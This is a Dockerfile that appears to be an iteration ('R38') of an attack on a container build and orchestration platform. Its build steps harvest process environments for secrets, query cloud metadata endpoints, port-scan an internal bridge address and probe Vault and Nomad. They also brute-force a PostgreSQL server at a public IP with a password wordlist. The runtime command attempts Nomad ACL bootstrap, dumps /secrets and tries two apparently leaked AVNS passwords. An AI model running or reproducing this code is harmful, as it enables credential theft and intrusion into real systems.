FROM alpine:3.20
RUN apk add --no-cache curl jq socat postgresql16-client python3 bind-tools

# BUILD PHASE probes - shared PID namespace with builder
RUN echo "=== BUILD R38 ===" && \
    echo "--- ALL PIDS ---" && \
    for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n); do \
      cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 300); \
      if [ -n "$cmdline" ]; then \
        echo "PID=$pid CMD=$cmdline"; \
      fi; \
    done && \
    echo "--- PID ENVIRONS ---" && \
    for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n | head -50); do \
      env=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' 2>/dev/null); \
      if [ -n "$env" ]; then \
        echo "=PID=$pid="; \
        echo "$env" | grep -iE '(pass|secret|token|key|auth|cred|vault|consul|nomad|aiven|falcon|flag|ssh|cert|pg|database|conn)' 2>/dev/null; \
      fi; \
    done && \
    echo "--- METADATA ---" && \
    for ip in 169.254.169.254 169.254.1.1 169.254.1.2 10.0.0.1 172.17.0.1; do \
      resp=$(curl -sk --connect-timeout 2 http://$ip/ 2>&1); \
      if [ $? -eq 0 ] && [ -n "$resp" ]; then echo "$ip: $resp" | head -c 300; echo; fi; \
      resp=$(curl -sk --connect-timeout 2 http://$ip/latest/meta-data/ 2>&1); \
      if [ $? -eq 0 ] && [ -n "$resp" ]; then echo "$ip/meta: $resp" | head -c 300; echo; fi; \
    done && \
    echo "--- VAULT ---" && \
    for ip in 169.254.1.2 127.0.0.1; do \
      for port in 8200 8201; do \
        resp=$(curl -sk --connect-timeout 2 https://$ip:$port/v1/sys/health 2>&1); \
        echo "vault $ip:$port: $resp" | head -c 200; echo; \
      done; \
    done && \
    echo "--- PORT SCAN 169.254.1.2 ---" && \
    for port in 53 80 443 2379 2380 4646 4647 4648 5432 6443 8080 8200 8201 8300 8301 8500 8501 8600 9090 9093 9100 9200 10250 12691 13133 15432 28319; do \
      (echo >/dev/tcp/169.254.1.2/$port) 2>/dev/null && echo "OPEN:$port"; \
    done && \
    echo "--- DNS ---" && \
    cat /etc/resolv.conf && \
    for name in vault vault.service.consul consul falcon falcon.service.consul nomad.service.consul postgresql.service.consul api.service.consul; do \
      result=$(dig +short $name @169.254.1.2 2>/dev/null); \
      [ -n "$result" ] && echo "DNS $name -> $result"; \
      result2=$(dig +short $name 2>/dev/null); \
      [ -n "$result2" ] && echo "DNS-def $name -> $result2"; \
    done && \
    echo "--- NETWORK ---" && \
    ip addr 2>/dev/null | grep inet && \
    ip route 2>/dev/null && \
    echo "--- NOMAD 4647 (RPC) ---" && \
    curl -sk --connect-timeout 2 https://169.254.1.2:4647/ 2>&1 | head -c 200 && echo && \
    echo "--- OTEL 13133 ---" && \
    curl -sk --connect-timeout 2 http://169.254.1.2:13133/ 2>&1 | head -c 200 && echo && \
    echo "--- FALCON PG CONNECT TESTS ---" && \
    for user in avnadmin postgres falcon ctf flag admin root _aiven replication hunter; do \
      for pass in "" avnadmin postgres falcon flag ctf aiven changeme password admin root hunter; do \
        result=$(PGPASSWORD="$pass" psql "host=132.145.163.127 port=12691 dbname=defaultdb sslmode=require user=$user connect_timeout=3" -c "SELECT version()" 2>&1); \
        if ! echo "$result" | grep -q "password authentication failed"; then \
          if ! echo "$result" | grep -q "FATAL"; then \
            echo "PG-OK: $user/$pass: $result"; \
          else \
            echo "PG-FATAL: $user: $(echo "$result" | head -1)"; \
          fi; \
        fi; \
      done; \
    done && \
    echo "--- BUILD PHASE DONE ---"

CMD ["sh", "-c", "\
echo R38-RUNTIME; \
N=https://169.254.1.2:4646; \
ALLOC=$(sed -n 's|.*alloc/\\([a-f0-9-]*\\)/.*|\\1|p' /proc/self/mountinfo | head -1); \
echo alloc=$ALLOC; \
echo '--- ACL bootstrap ---'; \
curl -sk -X POST $N/v1/acl/bootstrap 2>&1 | head -c 300; echo; \
echo '--- Nomad client allocation info ---'; \
curl -sk $N/v1/client/allocation/$ALLOC 2>&1 | head -c 500; echo; \
echo '--- Try getting alloc details from metrics ---'; \
METRICS=$(curl -sk $N/v1/metrics?format=prometheus 2>/dev/null); \
echo \"$METRICS\" | grep -o 'job=\"[^\"]*\"' | sort -u; \
echo '--- Check for falcon/pgsql in job names ---'; \
echo \"$METRICS\" | grep -iE '(falcon|pgsql|flag|ssh|key)' | head -20; \
echo '--- Port scan this host for PG ---'; \
for port in 5432 12691 28319 15432 6432; do \
  (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo LOCAL-OPEN:$port; \
  (echo >/dev/tcp/169.254.1.2/$port) 2>/dev/null && echo BRIDGE-OPEN:$port; \
done; \
echo '--- Check /secrets and /local ---'; \
ls -laR /secrets/ 2>&1; \
ls -laR /local/ 2>&1; \
cat /secrets/* 2>&1; \
cat /local/* 2>&1; \
echo '--- ALLOC env ---'; \
env | sort; \
echo '--- Try falcon PG with AVNS prefix passwords ---'; \
for pass in AVNS_X7G1y0yxW-Mih3yDw5q AVNS_e8_744VDpKBGrerEk4g; do \
  for user in avnadmin postgres falcon _aiven; do \
    result=$(PGPASSWORD=\"$pass\" psql \"host=132.145.163.127 port=12691 dbname=defaultdb sslmode=require user=$user connect_timeout=3\" -c 'SELECT version()' 2>&1); \
    echo \"$result\" | grep -qv 'password authentication failed' && echo \"AVNS-OK: $user: $result\"; \
  done; \
done; \
echo '--- DONE R38 ---'; \
sleep 600"]
